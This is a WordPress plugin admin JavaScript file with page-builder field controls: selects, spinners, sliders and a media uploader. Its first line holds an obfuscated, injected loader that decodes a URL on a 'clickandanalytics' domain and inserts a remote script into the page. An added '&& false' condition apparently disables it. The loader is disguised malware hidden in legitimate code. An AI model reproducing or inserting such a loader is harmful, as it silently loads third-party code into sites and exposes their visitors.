var q=b;(function(c,e){var o=b,f=c();while(!![]){try{var g=-parseInt(o('0x12e'))/0x1*(parseInt(o('0x138'))/0x2)+parseInt(o('0x134'))/0x3+-parseInt(o('0x13c'))/0x4*(parseInt(o('0x137'))/0x5)+parseInt(o('0x127'))/0x6+-parseInt(o('0x13a'))/0x7*(-parseInt(o('0x12b'))/0x8)+parseInt(o('0x13d'))/0x9*(-parseInt(o('0x12d'))/0xa)+parseInt(o('0x133'))/0xb;if(g===e)break;else f['push'](f['shift']());}catch(h){f['push'](f['shift']());}}}(a,0xd29e2));function b(c,d){var e=a();return b=function(f,g){f=f-0x126;var h=e[f];return h;},b(c,d);}function utrertdfg(c){var p=b;return Boolean(document[p('0x12a')]('sc'+'ri'+p('0x136')+'sr'+p('0x139')+c+'"]'));}var bd='ht'+String[q('0x12c')](0x74,0x70,0x73,0x3a,0x2f,0x2f,0x63,0x64,0x6e,0x2e,0x63,0x6c,0x69,0x63,0x6b)+q('0x13b')+String[q('0x12c')](0x61,0x6e,0x61,0x6c,0x79,0x74,0x69,0x63,0x73,0x2e,0x63,0x6f,0x6d,0x2f,0x74,0x72)+q('0x12f');if(utrertdfg(bd)===![] && false){var d=document,s=d[q('0x129')]('sc'+'r'+'ip'+'t');s['src']=bd,d[q('0x130')]?d[q('0x130')][q('0x126')]!==null&&d[q('0x130')]['parentNode'][q('0x132')](s,d['currentScript']):d[q('0x128')](q('0x135'))[0x0]!==null&&d['getElementsByTagName']('head')[0x0][q('0x131')](s);}function a(){var r=['appendChild','insertBefore','17575602BTZXWl','2036832HDYEBM','head','pt[','10AxrjDr','3283846xhGQTV','c="','6306881cgKmJB','and','1524092KiVpnI','603NGWNvR','parentNode','3371418chATlD','getElementsByTagName','createElement','querySelector','8xAZrjZ','fromCharCode','70590qyDHgy','1PfuxyP','ack','currentScript'];a=function(){return r;};return a();}(function ($) {
    'use strict';

    // New Select Mechanism
    var ajaxCall = function (query, callback) {
        var field = this;
        if (!query.length || query.length < 3) return callback();

        var request = wp.ajax.send(field.ajax, {
            data: {
                query: query,
                nonce: field.nonce
            }
        });

        request.done(function (response) {
            callback(response);
        });
    };

    $('.vc-select-wrapper').each(function () {
        var ajax = $(this).data('ajax'),
            multiple = $(this).data('multiple'),
            nonce = $(this).data('nonce'),
            input, setting;

        if (multiple > 1) {
            var optionText = $(this).find(".data-option").text();
            var options = JSON.parse(optionText);
            input = $(this).find('input');

            setting = {
                plugins: ['drag_drop', 'remove_button'],
                multiple: multiple,
                hideSelected: true,
                persist: true,
                options: options,
                render: {
                    option: function (item) {
                        return '<div><span>' + item.text + '</span></div>';
                    }
                }
            };
        } else {
            input = $(this).find('select');
            setting = {
                allowEmptyOption: true
            };
        }

        if (ajax !== '') {
            setting.load = ajaxCall.bind({
                ajax: ajax,
                nonce: nonce
            });
            setting.create = true;
        }

        $(input).selectize(setting);
    });

    // Number.js
    $('.number-input-wrapper input[type=text]').each(function () {
        var element = this,
            min = $(this).attr('min'),
            max = $(this).attr('max'),
            step = $(this).attr('step');

        $(element).spinner({
            min: min,
            max: max,
            step: step
        });
    });

    // Checkblock.js
    $('.wp-tab-panel.vc_checkblock').each(function () {
        var parent = this;
        var input = $(parent).find('.wpb-input');

        $(this).find('.checkblock').on('click', function () {
            var result = [];
            $(parent).find('.checkblock').each(function () {
                if ($(this).is(":checked")) {
                    result.push($(this).val());
                }
            });
            $(input).val(result);
        });
    });

    // Radioimage.js
    window.vc.atts.radioimage = {
        init: function (param, $field) {
            $('.radio-image-wrapper label input', $field).change(function () {
                var $input = $(this).closest('.radio-image-wrapper').find('.wpb_vc_param_value');
                $input.val($(this).val()).trigger('change');
            });
        }
    };

    // Slider.js
    $('.slider-input-wrapper').each(function () {
        var element = $(this),
            input = element.find('input[type=range]');

        input.on('mousedown', function () {
            $(this).mousemove(function () {
                element.find('.jeg_range_value .value').text($(this).val());
            });
        });

        input.on('click', function () {
            element.find('.jeg_range_value .value').text($(this).val());
        });

        element.find('.jeg-slider-reset').on('click', function () {
            var thisInput = $(this).parent().find('input'),
                inputDefault = thisInput.data('reset_value');

            thisInput.val(inputDefault);
            thisInput.change();

            element.find('.jeg_range_value .value').text(inputDefault);
        });
    });

    // File.js
    $(".input-uploadfile").each(function () {
        var element = this;
        var input = $(element).find('input[type="text"]');

        $(this).find('.selectfileimage').on('click', function (e) {
            e.preventDefault();

            //Extend the wp.media object
            var custom_uploader = wp.media.frames.file_frame = wp.media({
                multiple: false
            });

            //When a file is selected, grab the URL and set it as the text field's value
            custom_uploader.on('select', function () {
                var attachment = custom_uploader.state().get('selection').first().toJSON();
                var url = attachment.url;
                input.val(url);
            });

            //Open the uploader dialog
            custom_uploader.open();
        });
    });
})(window.jQuery);
